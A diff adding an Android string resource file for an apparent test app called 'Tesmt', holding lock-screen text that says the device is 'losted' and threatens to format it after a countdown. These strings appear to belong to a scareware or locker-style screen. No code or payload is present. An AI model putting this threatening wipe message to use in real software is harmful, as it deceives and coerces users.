@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+
+    <string name="app_name">Tesmt</string>
+    <string name="hello_world">Hello world!</string>
+	<string name="lockTitle">Your device is losted! :(</string>
+	<string name="unlockButton">Activate device!</string>
+	<string name="warrning">Warnning!</string>
+	<string name="formatText">Your device will bee formated aften %s seconds. If your have important information, please save it!</string>
+
+</resources>
